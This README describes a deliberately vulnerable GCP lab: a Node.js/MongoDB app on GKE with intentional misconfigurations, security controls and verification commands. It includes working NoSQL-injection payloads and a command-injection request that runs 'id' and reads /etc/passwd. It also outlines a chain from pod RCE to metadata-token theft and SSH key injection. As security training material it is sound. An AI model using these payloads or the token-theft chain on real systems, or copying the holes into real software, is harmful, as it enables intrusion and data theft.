# Wiz Technical Exercise v4

Two-tier web application on GCP with intentional security misconfigurations for demonstration purposes.

## Architecture

```
Internet → GCP HTTP LB → GKE (private subnet) → bucket-list app (Node.js)
                                                        ↓
                          VM (public subnet) ────→ MongoDB 6.0
                                                        ↓
                                                  cron backup → GCS bucket (public)
```

| Component | Details |
|-----------|---------|
| **App** | Node.js/Express SPA (`bucket-list/`) — task manager backed by MongoDB |
| **GKE Cluster** | Private cluster in `10.0.2.0/24`, exposed via GCE Ingress (HTTP LB) |
| **MongoDB VM** | Ubuntu 22.04, MongoDB 6.0, public IP, in `10.0.1.0/24` |
| **GCS Bucket** | Daily `mongodump` backups via cron |
| **Artifact Registry** | Docker repo with automatic vulnerability scanning |

## Intentional Misconfigurations

Required by the exercise spec — do not fix:

| Misconfiguration | Impact |
|------------------|--------|
| VM runs Ubuntu 22.04 | 1+ year outdated (24.04 LTS available since Apr 2024) |
| MongoDB 6.0 | EOL since Aug 2025 |
| SSH open to `0.0.0.0/0` | Anyone can attempt SSH to the VM |
| VM SA has `roles/compute.admin` | Can create/delete VMs, inject SSH keys |
| GCS bucket public read + listing | Backups (with credentials) accessible to anyone |
| App SA has `cluster-admin` | Pod can control the entire K8s cluster |
| 3 NoSQL injection endpoints | Query, search, and update injection |
| 1 command injection endpoint | OS command execution (RCE) in the pod |

## Security Controls

| Type | Control | Details |
|------|---------|---------|
| Preventative | Binary Authorization | GKE only runs images attested after passing vulnerability scan (no critical CVEs) |
| Preventative | Firewall | MongoDB restricted to GKE pod CIDR (`10.4.0.0/14`) only |
| Detective | GKE Security Posture | Workload vulnerability scanning enabled |
| Detective | Artifact Registry scanning | Automatic container image CVE scanning |
| Audit | GKE audit logging | `APISERVER`, `SYSTEM_COMPONENTS`, `WORKLOADS` |
| Secure config | MongoDB authentication | Admin + app user, connections require credentials |
| Secure config | GKE private nodes | No public IPs on cluster nodes |
| Pipeline | Checkov IaC scanning | Terraform misconfigurations reported in GitHub Security tab |
| Pipeline | Container vuln gate | CI fails on critical CVEs before attestation |

## Quick Start

### Local Development

```bash
cd bucket-list && docker compose up    # app at localhost:3000
```

### Deploy to GCP

```bash
# 1. Provision infrastructure
cd terraform
cp terraform.tfvars.example terraform.tfvars   # edit with your project ID + passwords
terraform init && terraform apply

# 2. Connect to GKE
gcloud container clusters get-credentials wiz-gke --zone us-central1-a --project clgcporg10-171

# 3. Create the MongoDB connection secret
MONGO_IP=$(terraform -chdir=terraform output -raw mongo_vm_internal_ip)
MONGO_USER=$(terraform -chdir=terraform output -raw mongo_app_user)
MONGO_PASS=$(terraform -chdir=terraform output -raw mongo_app_password)
kubectl create secret generic mongo-credentials \
  --from-literal=MONGO_URI="mongodb://${MONGO_USER}:${MONGO_PASS}@${MONGO_IP}:27017/bucketlist?authSource=bucketlist"

# 4. Deploy (or just push to main — CI handles it)
kubectl apply -k k8s/

# 5. Get the load balancer IP
kubectl get ingress bucket-list
```

### Tools Container

```bash
docker build -f Dockerfile.tools -t wiz-tools .
docker run --rm -it \
  -v "$(pwd):/workspace" \
  -v "$HOME/.config/gcloud:/root/.config/gcloud" \
  -v "$HOME/.kube:/root/.kube" \
  wiz-tools
```

## CI/CD Pipelines

### Container Pipeline (`.github/workflows/docker-build-push.yml`)

Triggers on push to `main` when `bucket-list/` changes:

1. **Build & push** — tags with commit SHA + `latest`, pushes to Artifact Registry
2. **Verify** — confirms `wizexercise.txt` is in the image
3. **Vulnerability scan gate** — waits for Container Analysis, fails on critical CVEs
4. **Binary Authorization attestation** — signs image with KMS key
5. **Deploy to GKE** — `kustomize edit set image` + `kubectl apply -k`

### Terraform Pipeline (`.github/workflows/terraform.yml`)

Triggers on push/PR to `main` when `terraform/` changes. Plans on PR (comments the diff), applies on merge.

### Checkov Pipeline (`.github/workflows/checkov.yml`)

Scans all Terraform code for misconfigurations, uploads SARIF results to GitHub Security tab.

---

## Verification Tests

All commands assume `gcloud config set project clgcporg10-171` and valid kubectl credentials.

### VM with MongoDB

**VM runs outdated Linux (Ubuntu 22.04)**

```bash
gcloud compute instances describe mongo-vm --zone=us-central1-a \
  --format="value(disks[0].licenses)"
# Contains "ubuntu-2204" — 24.04 LTS has been available since Apr 2024
```

**SSH exposed to `0.0.0.0/0`**

```bash
gcloud compute firewall-rules describe allow-ssh \
  --format="table(name, direction, sourceRanges, allowed[].map().firewall_rule().list())"
# sourceRanges: ['0.0.0.0/0'], allowed: tcp:22
```

**VM SA overprivileged (`roles/compute.admin`)**

```bash
gcloud projects get-iam-policy clgcporg10-171 \
  --flatten="bindings[].members" \
  --filter="bindings.members:mongo-vm-sa AND bindings.role:roles/compute.admin" \
  --format="table(bindings.role, bindings.members)"
```

**MongoDB outdated (6.0, EOL Aug 2025)**

```bash
gcloud compute ssh mongo-vm --zone=us-central1-a --command="mongod --version"
# db version v6.0.x
```

**MongoDB restricted to K8s network**

```bash
gcloud compute firewall-rules describe allow-mongo-from-gke \
  --format="table(name, sourceRanges, allowed[].map().firewall_rule().list(), targetTags)"
# sourceRanges: ['10.4.0.0/14'] (GKE pod CIDR), port tcp:27017
```

**MongoDB requires authentication**

```bash
gcloud compute ssh mongo-vm --zone=us-central1-a \
  --command="mongosh --eval 'db.runCommand({listDatabases:1})' 2>&1 | head -5"
# "command listDatabases requires authentication"
```

**Daily backup to GCS**

```bash
gcloud compute ssh mongo-vm --zone=us-central1-a --command="crontab -l"
# 0 2 * * * mongodump ... | gsutil cp - gs://clgcporg10-171-wiz-backups/...
```

**Bucket publicly accessible**

```bash
# List objects (no auth):
curl -s "https://storage.googleapis.com/storage/v1/b/clgcporg10-171-wiz-backups/o" | jq '.items[].name'

# Check IAM:
gsutil iam get gs://clgcporg10-171-wiz-backups
# allUsers: roles/storage.objectViewer + roles/storage.legacyBucketReader
```

### Kubernetes & Application

**Private cluster**

```bash
gcloud container clusters describe wiz-gke --zone=us-central1-a \
  --format="yaml(privateClusterConfig)"
# enablePrivateNodes: true
```

**MongoDB URI via K8s Secret**

```bash
kubectl get deployment bucket-list -o jsonpath='{.spec.template.spec.containers[0].env}' | jq .
# MONGO_URI from Secret "mongo-credentials"
```

**`wizexercise.txt` in container**

```bash
kubectl exec deploy/bucket-list -- cat /wizexercise.txt
```

**cluster-admin binding**

```bash
kubectl get clusterrolebinding bucket-list-admin -o yaml
# roleRef: cluster-admin, subject: bucket-list-sa

kubectl auth can-i --list --as=system:serviceaccount:default:bucket-list-sa | head -5
# *.* [*]
```

**Load balancer + health check**

```bash
LB_IP=$(kubectl get ingress bucket-list -o jsonpath='{.status.loadBalancer.ingress[0].ip}')
curl -s "http://${LB_IP}/api/health"
# {"status":"ok","db":"connected"}
```

**App works with data in MongoDB**

```bash
# Create a task via the API:
curl -s -X POST "http://${LB_IP}/api/tasks" \
  -H "Content-Type: application/json" \
  -d '{"title":"test task","description":"verification"}' | jq .

# List tasks:
curl -s "http://${LB_IP}/api/tasks" | jq .

# Verify directly in MongoDB:
gcloud compute ssh mongo-vm --zone=us-central1-a \
  --command="mongosh -u appuser -p <APP_PASSWORD> --authenticationDatabase bucketlist bucketlist --eval 'db.tasks.find().pretty()'"
```

### Application Vulnerabilities

```bash
LB_IP=$(kubectl get ingress bucket-list -o jsonpath='{.status.loadBalancer.ingress[0].ip}')
```

**NoSQL injection — operator injection**

```bash
curl -s "http://${LB_IP}/api/tasks?status[\$ne]=done" | jq length
# Returns tasks that don't have status "done" — operator injected via query param
```

**NoSQL injection — raw query**

```bash
curl -s -X POST "http://${LB_IP}/api/tasks/search" \
  -H "Content-Type: application/json" \
  -d '{"$where":"1==1"}' | jq .
# Dumps all tasks — entire request body used as MongoDB query
```

**NoSQL injection — raw update**

```bash
TASK_ID=$(curl -s "http://${LB_IP}/api/tasks" | jq -r '.[0]._id')
curl -s -X PUT "http://${LB_IP}/api/tasks/${TASK_ID}" \
  -H "Content-Type: application/json" \
  -d '{"$set":{"title":"PWNED"}}'
# Overwrites the title — request body used as raw MongoDB update
```

**Command injection (RCE)**

```bash
curl -s "http://${LB_IP}/api/tasks/export?format=json;id"
# Response includes: uid=0(root) gid=0(root) ...

curl -s "http://${LB_IP}/api/tasks/export?format=json;cat+/etc/passwd"
# Dumps /etc/passwd from the container
```

### Security Controls

**Audit logging**

```bash
gcloud container clusters describe wiz-gke --zone=us-central1-a \
  --format="yaml(loggingConfig)"
# enableComponents: SYSTEM_COMPONENTS, WORKLOADS, APISERVER
```

**Binary Authorization (preventative)**

```bash
gcloud container binauthz policy export
# evaluationMode: REQUIRE_ATTESTATION, attestor: vuln-scan-attestor

# Prove unattested images are rejected:
kubectl run test --image=nginx:latest
# Error: denied by attestation policy
```

**GKE Security Posture (detective)**

```bash
gcloud container clusters describe wiz-gke --zone=us-central1-a \
  --format="yaml(securityPostureConfig)"
# mode: BASIC, vulnerabilityMode: VULNERABILITY_BASIC
```

**Artifact Registry scanning (detective)**

```bash
gcloud artifacts docker images list \
  us-central1-docker.pkg.dev/clgcporg10-171/bucket-list \
  --show-occurrences --format=json | jq '.[0].vulnSummary'
```

### Attack Chain Simulation

The full chain demonstrates how individual misconfigurations combine into a complete compromise. An automated script is provided in [`pwned.sh`](pwned.sh):

```bash
./pwned.sh <LB_IP>
```

Steps:

1. **RCE** — command injection via `/api/tasks/export?format=json;id` gives code execution in the GKE pod
2. **Token theft** — query the GCP metadata server from inside the pod to get the node's SA OAuth token
3. **Lateral movement** — use the token to call the Compute Engine `setMetadata` API, injecting an SSH public key onto the MongoDB VM
4. **VM access** — SSH into the VM (firewall allows `0.0.0.0/0:22`, GCP auto-provisions metadata SSH keys)

---

## Project Structure

```
├── bucket-list/                        # Node.js app (Express + MongoDB)
│   ├── Dockerfile
│   ├── server.js
│   └── public/                         # SPA frontend
├── terraform/                          # IaC (GCP)
│   ├── main.tf                         # Provider config
│   ├── variables.tf / outputs.tf
│   ├── vpc.tf                          # VPC, subnets, firewall, Cloud NAT
│   ├── gke.tf                          # GKE private cluster + node pool
│   ├── vm.tf                           # MongoDB VM (Ubuntu 22.04)
│   ├── storage.tf                      # GCS backup bucket (public)
│   ├── iam.tf                          # Service accounts + IAM bindings
│   ├── artifact-registry.tf            # Docker repo + scanning APIs
│   ├── binary-authorization.tf         # KMS key, attestor, policy
│   └── scripts/mongo-startup.sh        # MongoDB install, auth, backup cron
├── k8s/                                # Kubernetes manifests (Kustomize)
│   ├── deployment.yaml                 # 2 replicas, MONGO_URI from Secret
│   ├── service.yaml                    # ClusterIP 80 → 3000
│   ├── ingress.yaml                    # GCE Ingress (HTTP LB)
│   ├── rbac.yaml                       # cluster-admin binding (intentional)
│   └── kustomization.yaml
├── .github/workflows/
│   ├── docker-build-push.yml           # Build, scan, attest, deploy
│   ├── terraform.yml                   # Plan on PR, apply on merge
│   └── checkov.yml                     # IaC security scanning
├── pwned.sh                            # Attack chain demo script
└── Dockerfile.tools                    # Dev toolbox (terraform + kubectl + gcloud)
```

### GitHub Secrets

| Secret | Purpose |
|--------|---------|
| `GCP_SA_KEY` | CI pipeline SA JSON key |
| `GCP_TERRAFORM_SA_KEY` | Terraform SA JSON key |
| `GCP_PROJECT_ID` | `clgcporg10-171` |
| `MONGO_ADMIN_PASSWORD` | MongoDB admin password |
| `MONGO_APP_PASSWORD` | MongoDB app password |
